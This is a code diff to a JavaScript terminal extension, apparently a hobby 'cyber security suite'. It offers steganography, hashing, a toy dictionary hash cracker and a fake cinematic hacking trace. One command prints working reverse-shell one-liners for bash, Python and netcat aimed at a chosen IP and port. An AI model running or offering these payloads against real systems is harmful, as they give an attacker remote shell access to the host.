@@ -43,11 +43,11 @@
 
   async function cinematicTrace(session, target) {
     const lines = [
-      `[*] Initializing connection to ${target}...`,
-      `[*] Resolving DNS... Found IP: 192.168.1.104`,
-      `[*] Bypassing firewall (Port 22, 80, 443)...`,
-      `[*] Injecting payload...`,
-      `[+] Access Granted. Root shell obtained.`
+      '[*] Initializing connection to ' + target + '...',
+      '[*] Resolving DNS... Found IP: 192.168.1.104',
+      '[*] Bypassing firewall (Port 22, 80, 443)...',
+      '[*] Injecting payload...',
+      '[+] Access Granted. Root shell obtained.'
     ];
     for (const line of lines) {
       await new Promise(r => setTimeout(r, 800));
@@ -57,7 +57,7 @@
   }
 
   T.registerExtension({
-    name: '😈',
+    name: 'kal',
     info: 'Steganography + Cyber Security Suite loaded.',
     descriptions: {
       HIDE:    'Hide text in PNG (HIDE <file.png> <text>)',
@@ -75,7 +75,7 @@
 
         const filename = match[1];
         const text = match[2];
-        this.printSystem(`Embedding secret text into ${filename}...`);
+        this.printSystem('Embedding secret text into ' + filename + '...');
 
         try {
           const { img } = await loadImageFromVFS(this, filename);
@@ -99,7 +99,7 @@
 
           const maxCapacityBytes = Math.floor((data.length * 3) / 8);
           if (fullBytes.length > maxCapacityBytes) {
-            return this.printError(`Text too large! This image can only hold ${maxCapacityBytes} bytes.`);
+            return this.printError('Text too large! This image can only hold ' + maxCapacityBytes + ' bytes.');
           }
 
           let bitIndex = 0;
@@ -127,8 +127,8 @@
           await T.Storage.set(target, { type: 'file', content: blob, isBinary: true }, 'vfs');
 
           this.printSuccess('Secret text hidden successfully!');
-          this.printSystem(`Saved as: ${newName}`);
-          this.printSystem('(Note: Do not convert to JPG — LSB data will be destroyed.)');
+          this.printSystem('Saved as: ' + newName);
+          this.printSystem('(Note: Do not convert to JPG - LSB data will be destroyed.)');
 
         } catch (e) {
           this.printError(e.message);
@@ -138,7 +138,7 @@
       SEEK: async function (arg) {
         const filename = arg.trim();
         if (!filename) return this.printError('Usage: SEEK <file.png>');
-        this.printSystem(`Scanning ${filename} for hidden data...`);
+        this.printSystem('Scanning ' + filename + ' for hidden data...');
 
         try {
           const { img } = await loadImageFromVFS(this, filename);
@@ -188,20 +188,20 @@
       HASH: async function (arg) {
         if (!arg) return this.printError('Usage: HASH <text>');
         const hash = await sha256(arg);
-        this.printSystem(`Plaintext: ${arg}`);
-        this.printSuccess(`SHA-256:   ${hash}`);
+        this.printSystem('Plaintext: ' + arg);
+        this.printSuccess('SHA-256:   ' + hash);
       },
 
       CRACK: async function (arg) {
         if (!arg) return this.printError('Usage: CRACK <sha256_hash>');
-        this.printSystem(`Target Hash: ${arg}`);
+        this.printSystem('Target Hash: ' + arg);
         this.printSystem('Initiating dictionary attack...');
         const dictionary = ['admin', 'password', '123456', 'root', 'hacker', 'secret', 'gojo', 'kalma', 'qwerty', 'letmein'];
         for (const word of dictionary) {
           await new Promise(r => setTimeout(r, 100));
           const hash = await sha256(word);
           if (hash === arg.toLowerCase()) {
-            return this.printSuccess(`CRACKED! The password is: ${word}`);
+            return this.printSuccess('CRACKED! The password is: ' + word);
           }
         }
         this.printError('FAILED. Password not found in dictionary.');
@@ -215,14 +215,14 @@
         const rot13 = arg.replace(/[a-zA-Z]/g, c => {
           return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
         });
-        this.printSystem(`Original: ${arg}`);
-        this.printSystem(`Base64:   ${b64}`);
-        this.printSuccess(`ROT13:    ${rot13}`);
+        this.printSystem('Original: ' + arg);
+        this.printSystem('Base64:   ' + b64);
+        this.printSuccess('ROT13:    ' + rot13);
       },
 
       TRACE: async function (arg) {
         const target = arg || '127.0.0.1';
-        this.printSystem(`Starting trace route to ${target}...`);
+        this.printSystem('Starting trace route to ' + target + '...');
         await cinematicTrace(this, target);
       },
 
@@ -230,13 +230,13 @@
         const parts = arg.trim().split(/\s+/);
         const ip = parts[0] || '10.0.0.1';
         const port = parts[1] || '4444';
-        this.printSystem(`[ Generated Payloads for ${ip}:${port} ]`);
+        this.printSystem('[ Generated Payloads for ' + ip + ':' + port + ' ]');
         this.printSystem('[ Bash (Linux) ]');
-        this.printSystem(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
+        this.printSystem('bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1');
         this.printSystem('[ Python ]');
-        this.printSystem(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`);
+        this.printSystem('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ip + '",' + port + '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'');
         this.printSystem('[ Netcat ]');
-        this.printSystem(`nc -e /bin/sh ${ip} ${port}`);
+        this.printSystem('nc -e /bin/sh ' + ip + ' ' + port);
       }
     }
   });
